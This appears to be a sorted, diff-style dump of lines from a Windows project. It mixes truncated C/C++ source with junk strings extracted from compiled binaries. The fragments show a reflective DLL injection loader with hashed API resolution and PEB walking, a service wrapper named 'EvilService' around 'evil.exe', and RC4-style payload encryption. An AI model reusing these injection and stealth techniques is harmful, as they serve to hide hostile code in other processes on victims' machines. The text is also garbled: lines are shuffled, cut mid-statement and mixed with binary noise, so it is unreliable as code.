+define DLL_QUERY_HMODULE
+define GETPROCADDRESS_HASH
+define HASH_KEY
+define IMAGE_REL_BASED_ARM_MOV32A
+define IMAGE_REL_BASED_ARM_MOV32T
+define KERNEL32DLL_HASH
+define LOADLIBRARYA_HASH
+define NTDLLDLL_HASH
+define NTFLUSHINSTRUCTIONCACHE_HASH
+define VIRTUALALLOC_HASH
+define WIN32_LEAN_AND_MEAN
+define _REFLECTIVEDLLINJECTION_REFLECTIVEDLLINJECTION_H
+define _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H
+dwAddress = ((WORD)HIWORD(uiLibraryAddress) 
+dwHashValue = hash((char
+dwInstruction 
+dwInstruction = 
+dwInstruction = (DWORD)(dwInstruction 
+dynamic atexit destructor for '
+dynamic initializer for '
+e%7A
+e3uE$
+eE2:
+eE3Md
+eLK(w
+eh vector constructor iterator'
+eh vector copy constructor iterator'
+eh vector destructor iterator'
+eh vector vbase constructor iterator'
+eh vector vbase copy constructor iterator'
+else
+else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_ARM_MOV32T)
+else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
+else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
+else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
+else if ((DWORD)uiValueC == NTDLLDLL_HASH)
+else if (dwHashValue == GETPROCADDRESS_HASH)
+else if (dwHashValue == VIRTUALALLOC_HASH)
+endif
+evil.exe
+evil.exe EvilService start/stop
+extern HINSTANCE hAppInstance
+f u!f t
+f%9A
+f) }m
+f-9A
+f92u
+f9:t
+f9:u
+f<Pt8F
+fDw_
+fEEPj
+fHlE
+fME]
+fabs
+fflush(stdout)
+floor
+fmod
+fname)
+for (i = 0
+for (l = 0
+frexp
+fuhuA
+fu}]}
+ghUN@
+gmsmr
+h 2A
+h = ror(h)
+h( @
+h(2A
+h(}A
+h0 A
+h0'DA
+h8!A
+h82A
+h8>A
+h<<<<<<<<
+h<hA
+h@!A
+h@2A
+h@hA
+hAppInstance = hinstDLL
+hD>A
+hH!A
+hH2A
+hHhA
+hH}A
+hL!A
+hP2A
+hPhA
+hTvA
+hX A
+hX!A
+hX2A
+hXhA
+hd!A
+hello
+hh!A
+hp}A
+ht2A
+hx A
+hx!A
+i = (i 
+i935
+if (
+if (!shService)
+if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
+if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE)
+if (((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE)
+if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
+if ((DWORD)uiValueC == KERNEL32DLL_HASH)
+if ((dwInstruction 
+if (0 != iOperateType)
+if (0 == g_ServiceStatusHandle)
+if (FALSE == bRet)
+if (NULL != hResource)
+if (NULL == argv[c]) break
+if (Reset == ERROR_ALREADY_EXISTS)
+if (argc != 5)
+if (c >= 100) break
+if (dwHashValue == LOADLIBRARYA_HASH 
+if (dwHashValue == LOADLIBRARYA_HASH)
+if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
+if (g_Handle)
+if (hGlobal == NULL)
+if (hRsrc == NULL)
+if (lpReserved != NULL)
+if (lpReserved != NULL) {
+if (pBuffer == NULL)
+if (pLoadLibraryA 
+if (totalSize == 0)
+if (uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) 
+if (uiValueD 
+if (uiValueD)
+ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+ifdef WIN_ARM
+ifdef WIN_X64
+ifdef WIN_X86
+ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
+ifndef _REFLECTIVEDLLINJECTION_REFLECTIVEDLLINJECTION_H
+ifndef _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H
+include <Shlwapi.h>
+include <Windows.h>
+include <Winsock2.h>
+include <intrin.h>
+include <shellapi.h>
+include <stdio.h>
+include <string>
+include <tchar.h>
+include <windows.h>
+int _tmain() {
+int l = 0
+int t = 0
+ipev 
+j = (j 
+j Y3
+j$[_3
+j0XEM
+j0Yf
+j2p2222
+j@%@
+jA_M4
+jA_M4 O
+jA_M4(OA
+jYMe
+jdSQ
+jdSQn
+jpeg
+k0SV
+k0S]
+kE0E0A
+kE0EP
+kE0EXA
+k[i] = Key[i%KeyLength]
+lVW}
+ldexp
+local static guard'
+local static thread guard'
+local vftable constructor closure'
+local vftable'
+log10
+lthu
+lu!ht
+managed vector constructor iterator'
+managed vector copy constructor iterator'
+managed vector destructor iterator'
+mfcribbon-ms</Extensions>
+modf
+mycode
+nUz<
+nan(ind)
+nan(snan)
+nz(wKgg
+oF f
+oNvI
+oNvf
+oV f
+obwQ4Y
+of@f
+offset : 12
+omni callsig'
+on0v00f
+onPf
+operator
+p0 E
+p3gVu
+p4u$WSQu
+p:RRN
+p@fE
+pD[E
+pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress 
+pHPY
+pHTY
+pH_Y
+pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress 
+pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress 
+pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress 
+ph<v
+placement delete closure'
+placement delete[] closure'
+pragma intrinsic( _ReturnAddress )
+pragma intrinsic( _rotr )
+q!-7
+q<<==)>X>>>
+rSShU
+reflective_dll.dll
+reflective_dll.pdb
+register DWORD dwAddress
+register DWORD dwInstruction
+register DWORD h = 0
+register WORD wImm
+restrict(
+resx
+return
+return -1
+return 0
+return 1
+return FALSE
+return TRUE
+return bReturnValue
+return h
+return uiValueA
+return(0)
+sKEPS!
+sStatus)
+s[i] = i
+s[i] = s[j]
+s[j] = tmp
+scalar deleting destructor'
+sdLi==
+shSCManager = NULL
+sinh
+sqrt
+ss))
+ss.dwControlsAccepted = SERVICE_ACCEPT_STOP 
+ss.dwCurrentState = dwServiceCode
+ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS
+ss.dwWaitHint = 3000
+ss.dwWin32ExitCode = 0
+st/!E
+start
+static  char
+stop
+string'
+struct _PEB_FREE_BLOCK
+suhuA
+switch (dwControl) {
+switch (dwReason)
+switch (iOperateType)
+szName = argv[2]
+szName = argv[3]
+t = (s[i] 
+t P6
+t V.
+t V/
+t V8G
+t V>F
+t VE
+t VF
+t X6A
+t d0
+t hH!
+t u u
+t!VP
+t!WH>
+t!WHYP
+t!WsYP
+t'1ung
+t'@-rA
+t'D=0Xt
+t'Vu
+t'u(u$u u
+t'un
+t(vL(
+t(vL}G
+t).u
+t)EMMe
+t)PPj
+t)t%C
+t-0j
+t-PjA
+t.6h
+t2D$
+t3D$
+t3M3
+t4SWV
+t4SWV3V
+t4uVSuj
+t5 A
+t5=A
+t8E 
+t9VV:VP
+t9VVnVP5
+t9VV{VP2
+t:@$
+t={1
+t>Vw Sh
+tCE%
+tD4YM8]u
+tRQT
+tRQ[
+tVEfE
+tVWYE
+tVWrYE
+tVWuYE
+tWY3_
+tWYP
+tW[YP
+tXBA
+tXP8]
+tYYh@
+t]F8
+t_KM
+tanh
+test.exe
+thXv
+ti0<
+tiV6
+tiVY}e
+tiff
+tl=6A
+tmp = s[i]
+transit.exe
+transit.exe c:
+tt>}
+type : 4
+typedef BOOL(WINAPI
+typedef DWORD(NTAPI
+typedef FARPROC(WINAPI
+typedef HMODULE(WINAPI
+typedef LPVOID(WINAPI
+typedef ULONG_PTR(WINAPI
+typedef struct
+typedef struct _LDR_DATA_TABLE_ENTRY
+typedef struct _UNICODE_STR
+typeof'
+u Ej
+u!3.t
+u$Eu u
+u$N(
+u$VhuA
+u$WhhvA
+u$t 
+u$t %
+u$t B
+u'V4
+u'V@
+u'VA
+u'VLA
+u(EE$uE
+u(Ej
+u(Eu$u u
+u(L$
+u-PWWS
+u-iA
+u.WOY3SFY
+u3:t
+u3M_3
+u3Vu
+u3u/
+u5BA
+u6EU
+u6up
+u7Y_
+u7lY_
+u7wY_
+u<dt
+uA=BA
+uAEj
+uAVA
+uAVp
+uEEEPj
+uEWPV
+uEWVP
+uEWVPuEWVPuEWVP
+uEu(u
+uI90t8
+uIhd
+uM$K
+uM_3
+uNSu$SWu
+uPRJ
+uPRRI
+uPVuu$j
+uQhd
+uSVu
+uVPRQ)7
+uVPRQD
+uVPRQQ
+uVY3_M
+uVY_[
+uYj5
+u]UEHEu3U
+u]fE
+u]}e
+udt returning'
+uhuA
+uiAddressArray 
+uiAddressArray = (uiBaseAddress 
+uiAddressArray = (uiLibraryAddress 
+uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase
+uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr
+uiBaseAddress = __readfsdword(0x30)
+uiBaseAddress = __readgsqword(0x60)
+uiExportDir = (uiBaseAddress 
+uiExportDir = (uiLibraryAddress 
+uiExportDir = uiBaseAddress 
+uiExportDir = uiLibraryAddress 
+uiHeaderValue 
+uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew
+uiHeaderValue = uiLibraryAddress 
+uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress 
+uiLibraryAddress = caller()
+uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase
+uiLibraryAddress--
+uiNameArray 
+uiNameArray = (ULONG_PTR) 
+uiNameArray = (uiBaseAddress 
+uiNameOrdinals 
+uiNameOrdinals = (uiBaseAddress 
+uiValueA 
+uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders
+uiValueA = ((ULONG_PTR) 
+uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink
+uiValueA = (uiBaseAddress 
+uiValueA = DEREF(uiValueA)
+uiValueB
+uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC)
+uiValueB = (ULONG_PTR) 
+uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer
+uiValueB = (uiBaseAddress 
+uiValueB = uiLibraryAddress
+uiValueC 
+uiValueC = (uiBaseAddress 
+uiValueC = (uiLibraryAddress 
+uiValueC = 0
+uiValueC = ror((DWORD)uiValueC)
+uiValueC = uiBaseAddress
+uiValueC = uiValueC 
+uiValueD 
+uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData
+uiValueD = (uiBaseAddress 
+uiValueD = uiValueC 
+uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections
+ujQ2
+ujQ=
+usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length
+usCounter = 1
+usCounter = 3
+usCounter--
+ut3WWVuj
+ut4s
+uuE2
+uuE2A
+uuYE
+u{]h<uy]E
+v.4v
+v3uE
+v4YYF1<gt
+v4YYF48-u
+v6j0F[
+vHWu'
+vZWh
+vbase destructor'
+vbtable'
+vcall'
+vector constructor iterator'
+vector copy constructor iterator'
+vector deleting destructor'
+vector destructor iterator'
+vector vbase constructor iterator'
+vector vbase copy constructor iterator'
+vftable'
+vh 7@
+vhwL@
+virtual displacement map'
+void MyFunc() {
+void StreamCrypt(char 
+void __stdcall LphandlerFunction(DWORD dwControl) {
+void __stdcall LpserviceMainFunctiona(
+w$d7@
+wHuhj
+wIPS3
+wImm 
+wImm = (WORD)(dwInstruction 
+wLuCj
+wOtD9
+wYMEIH
+wdq=v/
+while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
+while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
+while (1) {
+while (DEREF(uiValueA))
+while (TRUE)
+while (TRUE) {
+while (uiValueA)
+while (uiValueA--)
+while (uiValueB--)
+while (uiValueD--)
+while (uiValueE--)
+while (usCounter > 0)
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x86 = Debug
+x86 = Release
+x86.ActiveCfg = Debug
+x86.ActiveCfg = Release
+x86.Build.0 = Debug
+x86.Build.0 = Release
+xH8A
+xffftfpflfhE
+xh2k
+xml version='1.0' encoding='UTF-8' standalone='yes'
+xpxxxx
+xsd</Extensions>
+xt6_
+y001
+y7i9
+y<<<<
+ycg6fvPb
+yrvxyN
+yx6A
+z2}33
+z3/t
+zKG-wn@
+zO]3AOmm
+zY$Vu
+{22020898-6F0D-4D71-B14D-CB5897C5A6AA}.Debug
+{22020898-6F0D-4D71-B14D-CB5897C5A6AA}.Release
+{580BA177-CF9A-458C-A692-36DD6F23EA77}.Debug
+{580BA177-CF9A-458C-A692-36DD6F23EA77}.Release
+{CF25B9F3-849E-447F-A029-2FEF5969ECA3}.Debug
+{CF25B9F3-849E-447F-A029-2FEF5969ECA3}.Release
+{LHM
+{U}w(j
+} while (
+} while (--usCounter)
+}$39E(j
+}3PPPPPWSu
+}=DA
+}Rich}
+}VT6
+}VTY 
+}YYu
+}]M9
+}]j Y
+}a2=
+}eSw S
+}fE3
+}fL3.
+}tDEF@E4d$
+}wPj
